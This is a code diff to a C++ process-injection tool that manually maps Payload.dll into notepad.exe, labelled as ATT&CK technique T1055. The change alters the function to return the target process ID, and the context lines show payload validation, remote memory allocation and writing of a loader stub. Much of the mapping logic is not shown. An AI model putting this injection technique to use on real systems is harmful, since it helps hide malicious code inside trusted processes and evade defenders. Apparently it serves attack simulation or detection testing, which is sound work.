@@ -188,7 +188,7 @@ static DWORD WINAPI LoaderStubEnd() { return 0; }
 // Manual Mapping Attack (T1055 — Manual Map Injection)
 // Full implementation: maps Payload.dll into notepad.exe
 // ============================================================
-bool PerformManualMapping()
+DWORD PerformManualMapping()
 {
     HANDLE hProcess = nullptr;
 
@@ -217,7 +217,7 @@ bool PerformManualMapping()
         {
             LogActivity("[-] Failed to read Payload.dll!");
             LogActivity("[-] Ensure Payload.dll is in the same folder as this executable.");
-            return false;
+            return 0;
         }
 
         LogActivity("    -> Size: " + std::to_string(payloadData.size()) + " bytes");
@@ -231,21 +231,21 @@ bool PerformManualMapping()
         if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
         {
             LogActivity("[-] Invalid DOS signature in Payload.dll!");
-            return false;
+            return 0;
         }
 
         PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pPayload + pDosHeader->e_lfanew);
         if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
         {
             LogActivity("[-] Invalid NT signature in Payload.dll!");
-            return false;
+            return 0;
         }
 
         // Verify it's a DLL
         if (!(pNtHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL))
         {
             LogActivity("[-] Payload is not a DLL!");
-            return false;
+            return 0;
         }
 
         DWORD_PTR payloadImageBase = pNtHeaders->OptionalHeader.ImageBase;
@@ -287,7 +287,7 @@ bool PerformManualMapping()
         if (!created)
         {
             LogActivity("[-] Failed to launch notepad.exe. Error: " + std::to_string(GetLastError()));
-            return false;
+            return 0;
         }
 
         // Give notepad a moment to initialize
@@ -318,7 +318,7 @@ bool PerformManualMapping()
         {
             LogActivity("[-] VirtualAllocEx failed. Error: " + std::to_string(GetLastError()));
             CloseHandle(hProcess);
-            return false;
+            return 0;
         }
 
         {
@@ -529,7 +529,7 @@ bool PerformManualMapping()
             LogActivity("[-] Failed to allocate data memory. Error: " + std::to_string(GetLastError()));
             VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
             CloseHandle(hProcess);
-            return false;
+            return 0;
         }
 
         WriteProcessMemory(hProcess, remoteData, &mappingData, sizeof(ManualMappingData), &written);
@@ -548,7 +548,7 @@ bool PerformManualMapping()
             VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
             VirtualFreeEx(hProcess, remoteData, 0, MEM_RELEASE);
             CloseHandle(hProcess);
-            return false;
+            return 0;
         }
 
         WriteProcessMemory(hProcess, remoteStub, (LPVOID)LoaderStub, stubSize, &written);
@@ -571,7 +571,7 @@ bool PerformManualMapping()
             VirtualFreeEx(hProcess, remoteData, 0, MEM_RELEASE);
             VirtualFreeEx(hProcess, remoteStub, 0, MEM_RELEASE);
             CloseHandle(hProcess);
-            return false;
+            return 0;
         }
 
         // Wait for the loader to finish (imports resolved, DllMain called)
@@ -605,7 +605,7 @@ bool PerformManualMapping()
         LogActivity("============================================");
 
         CloseHandle(hProcess);
-        return (exitCode == 0);
+        return (exitCode == 0) ? targetPID : 0;
     }
     catch (...)
     {
@@ -614,6 +614,6 @@ bool PerformManualMapping()
         {
             CloseHandle(hProcess);
         }
-        return false;
+        return 0;
     }
 }
